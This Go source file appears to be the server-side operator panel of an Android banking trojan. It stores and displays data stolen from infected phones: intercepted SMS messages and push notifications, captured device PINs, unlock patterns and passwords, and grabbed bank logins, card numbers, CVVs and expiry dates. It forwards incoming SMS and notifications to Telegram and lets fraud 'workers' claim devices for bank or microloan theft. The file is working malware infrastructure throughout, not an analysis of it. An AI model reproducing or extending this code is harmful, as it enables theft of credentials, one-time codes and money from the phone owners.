package api

import (
	"encoding/json"
	"fmt"
	"net/http"
	"strings"
	"sync"
	"time"

	"redwing/internal/db"
)

// pushDedup deduplicates incoming push notifications within a 5-minute window.
// VPN apps (e.g. Happ) keep a persistent notification that refreshes constantly —
// without this, each refresh generates a Telegram alert.
var (
	pushDedupMu    sync.Mutex
	pushDedupCache = map[string]time.Time{}
)

func pushDedupKey(deviceID, pkg, title, text string) string {
	return fmt.Sprintf("%s|%s|%s|%s", deviceID, pkg, title, text)
}

func isPushDuplicate(deviceID, pkg, title, text string) bool {
	key := pushDedupKey(deviceID, pkg, title, text)
	now := time.Now()
	pushDedupMu.Lock()
	defer pushDedupMu.Unlock()
	if t, ok := pushDedupCache[key]; ok && now.Sub(t) < 5*time.Minute {
		return true
	}
	pushDedupCache[key] = now
	// Evict stale entries periodically (keep cache small)
	if len(pushDedupCache) > 500 {
		for k, t := range pushDedupCache {
			if now.Sub(t) >= 5*time.Minute {
				delete(pushDedupCache, k)
			}
		}
	}
	return false
}

func HandleDeviceApps(w http.ResponseWriter, r *http.Request) {
	parts := strings.Split(strings.TrimPrefix(r.URL.Path, "/api/panel/device/apps/"), "/")
	var deviceID string
	if len(parts) >= 2 {
		deviceID = parts[1]
	}
	teamID := SessionTeamID(r)

	if deviceID == "" {
		writeJSON(w, map[string]any{"apps": []any{}})
		return
	}

	var appsJSON string
	err := db.DB.QueryRow("SELECT COALESCE(apps_list, '[]') FROM devices WHERE device_id = ? AND team_id = ?", deviceID, teamID).Scan(&appsJSON)
	if err != nil {
		writeJSON(w, map[string]any{"apps": []any{}})
		return
	}

	var apps any
	if json.Unmarshal([]byte(appsJSON), &apps) != nil {
		apps = []any{}
	}

	LogActionFromRequest(r, ActionViewApps, deviceID, "")

	writeJSON(w, map[string]any{"apps": apps})
}

func HandleDeviceSMS(w http.ResponseWriter, r *http.Request) {
	parts := strings.Split(strings.TrimPrefix(r.URL.Path, "/api/panel/device/sms/"), "/")
	var deviceID string
	if len(parts) >= 2 {
		deviceID = parts[1]
	}
	teamID := SessionTeamID(r)

	rows, err := db.DB.Query(
		"SELECT id, sender, body, created_at FROM sms WHERE device_id = ? AND team_id = ? ORDER BY created_at DESC LIMIT 200",
		deviceID, teamID,
	)
	if err != nil {
		writeJSON(w, map[string]any{"sms": []any{}})
		return
	}
	defer rows.Close()

	var list []map[string]any
	for rows.Next() {
		var id int
		var sender, body, created string
		rows.Scan(&id, &sender, &body, &created)
		list = append(list, map[string]any{
			"id": id, "sender": sender, "body": body, "created_at": created,
		})
	}
	if list == nil {
		list = []map[string]any{}
	}
	LogActionFromRequest(r, ActionViewSMS, deviceID, "")

	writeJSON(w, map[string]any{"sms": list})
}

func HandleDevicePushLogs(w http.ResponseWriter, r *http.Request) {
	parts := strings.Split(strings.TrimPrefix(r.URL.Path, "/api/panel/device/push/"), "/")
	var deviceID string
	if len(parts) >= 2 {
		deviceID = parts[1]
	}
	teamID := SessionTeamID(r)

	rows, err := db.DB.Query(
		"SELECT id, package, COALESCE(app_name,''), title, text, created_at FROM push_logs WHERE device_id = ? AND team_id = ? ORDER BY created_at DESC LIMIT 200",
		deviceID, teamID,
	)
	if err != nil {
		writeJSON(w, map[string]any{"logs": []any{}})
		return
	}
	defer rows.Close()

	var logs []map[string]any
	for rows.Next() {
		var id int
		var pkg, appName, title, text, created string
		rows.Scan(&id, &pkg, &appName, &title, &text, &created)
		if appName == "" {
			appName = appDisplayName(pkg, "")
		}
		logs = append(logs, map[string]any{
			"id": id, "package": pkg, "app_name": appName, "title": title, "text": text, "created_at": created,
		})
	}
	if logs == nil {
		logs = []map[string]any{}
	}
	LogActionFromRequest(r, ActionViewPush, deviceID, "")

	writeJSON(w, map[string]any{"logs": logs})
}

func transformGrab(id int, grabType, created string, raw map[string]any) map[string]any {
	str := func(key string) string {
		v, _ := raw[key].(string)
		return v
	}

	category := grabType
	var text, appName, appPkg, hint string

	switch grabType {
	case "pin_captured":
		category = "pin"
		text = str("pin")
		appName = "Device PIN"
		appPkg = str("package")
		if appPkg == "" {
			appPkg = "system"
		}
	case "pattern_captured":
		category = "pattern"
		text = str("pattern")
		appName = "Device Pattern"
		appPkg = "system"
	case "password_captured":
		category = "password"
		text = str("password")
		appName = "Device Password"
		appPkg = "system"
	case "bank_cred_captured":
		ft := str("field_type")
		switch ft {
		case "card_number":
			category = "card"
		case "cvv":
			category = "cvv"
		case "expiry":
			category = "expiry"
		default:
			category = "login"
		}
		text = str("text")
		appName = str("app_name")
		appPkg = str("package")
		hint = str("hint")
	}

	if appName == "" {
		appName = str("app_name")
	}
	if appName == "" && appPkg != "" {
		appName = appPkg
	}

	return map[string]any{
		"id":          id,
		"category":    category,
		"text":        text,
		"app_name":    appName,
		"app_package": appPkg,
		"hint":        hint,
		"created_at":  created,
	}
}

func HandleDeviceGrabs(w http.ResponseWriter, r *http.Request) {
	parts := strings.Split(strings.TrimPrefix(r.URL.Path, "/api/panel/device/grabs/"), "/")
	var deviceID string
	if len(parts) >= 2 {
		deviceID = parts[1]
	}
	teamID := SessionTeamID(r)

	rows, err := db.DB.Query(
		"SELECT id, grab_type, data, created_at FROM grabs WHERE device_id = ? AND team_id = ? ORDER BY created_at DESC LIMIT 200",
		deviceID, teamID,
	)
	if err != nil {
		writeJSON(w, map[string]any{"grabs": []any{}})
		return
	}
	defer rows.Close()

	var grabs []map[string]any
	for rows.Next() {
		var id int
		var gtype, data, created string
		rows.Scan(&id, &gtype, &data, &created)
		var raw map[string]any
		json.Unmarshal([]byte(data), &raw)
		if raw == nil {
			raw = map[string]any{}
		}
		grabs = append(grabs, transformGrab(id, gtype, created, raw))
	}
	if grabs == nil {
		grabs = []map[string]any{}
	}
	LogActionFromRequest(r, ActionViewGrabs, deviceID, "")

	writeJSON(w, map[string]any{"grabs": grabs})
}

func HandleDeviceLabel(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		writeJSON(w, map[string]any{"error": "method not allowed"})
		return
	}
	var body struct {
		DeviceID string `json:"device_id"`
		Label    string `json:"label"`
		Notes    string `json:"notes"`
		Alias    string `json:"alias"`
	}
	json.NewDecoder(r.Body).Decode(&body)
	if body.DeviceID == "" {
		writeJSON(w, map[string]any{"error": "device_id required"})
		return
	}
	teamID := SessionTeamID(r)
	db.DB.Exec("UPDATE devices SET label = ?, notes = ?, alias = ? WHERE device_id = ? AND team_id = ?", body.Label, body.Notes, body.Alias, body.DeviceID, teamID)
	LogActionFromRequest(r, ActionEditLabel, body.DeviceID, "Label: "+body.Label+" Alias: "+body.Alias)
	writeJSON(w, map[string]any{"success": true})
}

func HandleClaimDevice(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		writeJSON(w, map[string]any{"error": "method not allowed"})
		return
	}
	parts := strings.Split(strings.TrimPrefix(r.URL.Path, "/api/panel/claim/"), "/")
	var deviceID string
	if len(parts) >= 2 {
		deviceID = parts[1]
	}
	teamID := SessionTeamID(r)
	if deviceID == "" || teamID == "" {
		writeJSON(w, map[string]any{"error": "missing params"})
		return
	}
	var body struct {
		LockType    string `json:"lock_type"`
		VbiverLogin string `json:"vbiver_login"`
	}
	json.NewDecoder(r.Body).Decode(&body)
	if body.LockType != "MFO" && body.LockType != "BANK" {
		writeJSON(w, map[string]any{"error": "invalid lock_type"})
		return
	}
	col := "mfo_locked_by"
	if body.LockType == "BANK" {
		col = "bank_locked_by"
	}
	login := body.VbiverLogin
	if login == "" {
		login = r.URL.Query().Get("login")
	}
	db.DB.Exec("UPDATE devices SET "+col+" = ? WHERE device_id = ? AND team_id = ?", login, deviceID, teamID)
	writeJSON(w, map[string]any{"success": true, "worker": login})
}

func HandleUnclaimDevice(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		writeJSON(w, map[string]any{"error": "method not allowed"})
		return
	}
	parts := strings.Split(strings.TrimPrefix(r.URL.Path, "/api/panel/unclaim/"), "/")
	var deviceID string
	if len(parts) >= 2 {
		deviceID = parts[1]
	}
	teamID := SessionTeamID(r)
	if deviceID == "" || teamID == "" {
		writeJSON(w, map[string]any{"error": "missing params"})
		return
	}
	var body struct {
		LockType string `json:"lock_type"`
	}
	json.NewDecoder(r.Body).Decode(&body)
	if body.LockType != "MFO" && body.LockType != "BANK" {
		writeJSON(w, map[string]any{"error": "invalid lock_type"})
		return
	}
	col := "mfo_locked_by"
	if body.LockType == "BANK" {
		col = "bank_locked_by"
	}
	db.DB.Exec("UPDATE devices SET "+col+" = '' WHERE device_id = ? AND team_id = ?", deviceID, teamID)
	writeJSON(w, map[string]any{"success": true})
}

func HandleDeviceDelete(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodDelete && r.Method != http.MethodPost {
		writeJSON(w, map[string]any{"error": "method not allowed"})
		return
	}

	teamID := SessionTeamID(r)

	var body struct {
		DeviceID string `json:"device_id"`
	}
	json.NewDecoder(r.Body).Decode(&body)
	if body.DeviceID == "" {
		writeJSON(w, map[string]any{"error": "device_id required"})
		return
	}

	LogActionFromRequest(r, ActionDeleteDevice, body.DeviceID, "Устройство удалено")

	db.DB.Exec("UPDATE devices SET deleted = 1, is_online = 0 WHERE device_id = ? AND team_id = ?", body.DeviceID, teamID)
	db.DB.Exec("DELETE FROM sms WHERE device_id = ? AND team_id = ?", body.DeviceID, teamID)
	db.DB.Exec("DELETE FROM commands WHERE device_id = ? AND team_id = ?", body.DeviceID, teamID)
	db.DB.Exec("DELETE FROM contacts WHERE device_id = ? AND team_id = ?", body.DeviceID, teamID)
	db.DB.Exec("DELETE FROM push_logs WHERE device_id = ? AND team_id = ?", body.DeviceID, teamID)
	db.DB.Exec("DELETE FROM grabs WHERE device_id = ? AND team_id = ?", body.DeviceID, teamID)
	db.DB.Exec("DELETE FROM inject_data WHERE device_id = ? AND team_id = ?", body.DeviceID, teamID)

	writeJSON(w, map[string]any{"success": true})
}

func HandleLogout(w http.ResponseWriter, r *http.Request) {
	cookie, err := r.Cookie("rw_session")
	if err == nil && cookie.Value != "" {
		db.DB.Exec("DELETE FROM sessions WHERE token = ?", cookie.Value)
	}

	http.SetCookie(w, &http.Cookie{
		Name:     "rw_session",
		Value:    "",
		Path:     "/",
		MaxAge:   -1,
		HttpOnly: true,
	})

	writeJSON(w, map[string]any{"success": true})
}

func HandleDevicePushNotification(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		writeJSON(w, map[string]any{"success": true})
		return
	}

	var req map[string]any
	json.NewDecoder(r.Body).Decode(&req)

	deviceID, _ := req["device_id"].(string)
	teamID, _ := req["team_id"].(string)
	if teamID != "" {
		teamID = ResolveDeviceTeam(teamID)
	}
	// APK sends "package_name" and "app_name" (resolved via getApplicationLabel)
	pkg, _ := req["package_name"].(string)
	if pkg == "" {
		pkg, _ = req["package"].(string) // fallback for older APK builds
	}
	title, _ := req["title"].(string)
	text, _ := req["text"].(string)
	appName, _ := req["app_name"].(string)

	if teamID == "" && deviceID != "" {
		db.DB.QueryRow("SELECT COALESCE(team_id,'') FROM devices WHERE device_id = ?", deviceID).Scan(&teamID)
	}

	if appName == "" {
		appName = appDisplayName(pkg, "")
	}

	if deviceID != "" {
		db.DB.Exec(
			"INSERT INTO push_logs (device_id, team_id, package, app_name, title, text) VALUES (?, ?, ?, ?, ?, ?)",
			deviceID, teamID, pkg, appName, title, text,
		)

		// Only send Telegram if this exact notification wasn't seen in the last 5 minutes.
		// Prevents spam from persistent notifications (VPN, music players, etc.) that
		// refresh constantly in the notification shade.
		if !isPushDuplicate(deviceID, pkg, title, text) {
			SendTelegramNotification(teamID, "push", map[string]string{
				"device_id": deviceID,
				"package":   pkg,
				"app_name":  appName,
				"title":     title,
				"text":      text,
			})
		}
	}

	writeJSON(w, map[string]any{"success": true})
}

func HandleDeviceSMSIncoming(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		writeJSON(w, map[string]any{"success": true})
		return
	}

	var req map[string]any
	json.NewDecoder(r.Body).Decode(&req)

	deviceID, _ := req["device_id"].(string)
	teamID, _ := req["team_id"].(string)
	if teamID != "" {
		teamID = ResolveDeviceTeam(teamID)
	}
	sender, _ := req["from"].(string)
	if sender == "" {
		sender, _ = req["sender"].(string)
	}
	body, _ := req["body"].(string)
	if body == "" {
		body, _ = req["text"].(string)
	}

	if teamID == "" && deviceID != "" {
		db.DB.QueryRow("SELECT COALESCE(team_id,'') FROM devices WHERE device_id = ?", deviceID).Scan(&teamID)
	}

	if deviceID != "" && body != "" {
		db.DB.Exec(
			"INSERT INTO sms (device_id, team_id, sender, body) VALUES (?, ?, ?, ?)",
			deviceID, teamID, sender, body,
		)

		addEvent(teamID, deviceID, "sms", "SMS from "+sender)

		SendTelegramNotification(teamID, "sms", map[string]string{
			"device_id": deviceID,
			"from":      sender,
			"body":      body,
		})
	}

	writeJSON(w, map[string]any{"success": true})
}
